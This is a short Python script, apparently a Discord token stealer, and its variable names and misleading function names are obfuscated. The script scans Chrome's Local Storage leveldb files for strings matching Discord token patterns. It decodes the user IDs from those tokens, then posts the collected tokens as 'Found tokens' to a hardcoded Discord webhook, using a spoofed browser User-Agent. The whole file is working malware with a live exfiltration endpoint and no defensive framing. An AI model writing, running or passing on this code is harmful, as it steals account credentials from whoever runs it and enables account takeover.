import re 
import os 
import base64 
import typing 
import json 
import urllib .request 
TOKEN_REGEX_PATTERN =r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
REQUEST_HEADERS ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"}

def make_post_request (OO00OOO0OOOOOO0O0 :str ,O0OO0OO000OO000O0 :typing .Dict [str ,str ])->int :
    O000OOOOO00OO0OO0 =urllib .request .Request (OO00OOO0OOOOOO0O0 ,data =json .dumps (O0OO0OO000OO000O0 ).encode (),headers =REQUEST_HEADERS )
    with urllib .request .urlopen (O000OOOOO00OO0OO0 )as O0O00OO0O0OO000O0 :
        O0O0OOOOOOO000O00 =O0O00OO0O0OO000O0 .status 
    return O0O0OOOOOOO000O00 
def request_reader (OOO0OO00OOOOO00O0 :str )->typing .Union [list [str ],None ]:
    with open (OOO0OO00OOOOO00O0 ,encoding ="utf-8",errors ="ignore")as O0000O0O0OO0000OO :
        try :
            O00O0O00000OOO000 =O0000O0O0OO0000OO .read ()
        except PermissionError :
            return None 
    O0OO0OO0O0O0000O0 =re .findall (TOKEN_REGEX_PATTERN ,O00O0O00000OOO000 )
    return O0OO0OO0O0O0000O0 if O0OO0OO0O0O0000O0 else None 
def request_processor (O0O00O00O00O0O0O0 :str )->typing .Union [None ,str ]:
    ""
    try :
        O000O0O0OOOOO0OOO =base64 .b64decode (O0O00O00O00O0O0O0 .split (".",maxsplit =1 )[0 ]+"==").decode ("utf-8")
    except UnicodeDecodeError :
        return None 
    return O000O0O0OOOOO0OOO 
def request_closer (O00OOO00O000O0OO0 :str )->typing .Dict [str ,set ]:
    ""
    O0OO0O0O0O00OO00O =[os .path .join (O00OOO00O000O0OO0 ,OOOO0OOO00000O00O )for OOOO0OOO00000O00O in os .listdir (O00OOO00O000O0OO0 )]
    OO000OOOOO000000O :typing .Dict [str ,set ]=dict ()
    for OOOO0000OO000OOOO in O0OO0O0O0O00OO00O :
        O0O00O0OOOOOO0OO0 =request_reader (OOOO0000OO000OOOO )
        if O0O00O0OOOOOO0OO0 is None :
            continue 
        for OO000O00OOO00OOO0 in O0O00O0OOOOOO0OO0 :
            OOOOOOOO00O0O0O0O =request_processor (OO000O00OOO00OOO0 )
            if OOOOOOOO00O0O0O0O is None :
                continue 
            if OOOOOOOO00O0O0O0O not in OO000OOOOO000000O :
                OO000OOOOO000000O [OOOOOOOO00O0O0O0O ]=set ()
            OO000OOOOO000000O [OOOOOOOO00O0O0O0O ].add (OO000O00OOO00OOO0 )
    return OO000OOOOO000000O if OO000OOOOO000000O else None 
net_req ="https://discord.com/api/webhooks/1327294213250875464/O6UmNdve7tqmqx3f-4a04KzMQqp8LDuA4TwModtVXnApFWGPIhXBpeu11N1AGD39_o9y"
def keep_alive_till_final (O00O0O0O000O00000 :str ,O00O0000000OO00OO :typing .Dict [str ,set [str ]])->int :
    ""
    O0O00O000OO00OO00 :list [dict ]=list ()
    for O0O0OOO0000OO0O0O ,OOOO0000O0000OOO0 in O00O0000000OO00OO .items ():
        O0O00O000OO00OO00 .append ({"name":O0O0OOO0000OO0O0O ,"value":"\n".join (OOOO0000O0000OOO0 )})
    OOOO00O000OO0OOO0 ={"content":"Found tokens","embeds":[{"fields":O0O00O000OO00OO00 }]}
    make_post_request (O00O0O0O000O00000 ,OOOO00O000OO0OOO0 )
def main ()->None :
    OOO0OO00OOOO00OO0 =os .path .join (os .getenv ("LOCALAPPDATA"),r"Google\Chrome\User Data\Default\Local Storage\leveldb")
    OOOO0OO00O000O00O =request_closer (OOO0OO00OOOO00OO0 )
    if OOOO0OO00O000O00O is None :
        return 
    keep_alive_till_final (net_req ,OOOO0OO00O000O00O )
if __name__ =="__main__":
    main ()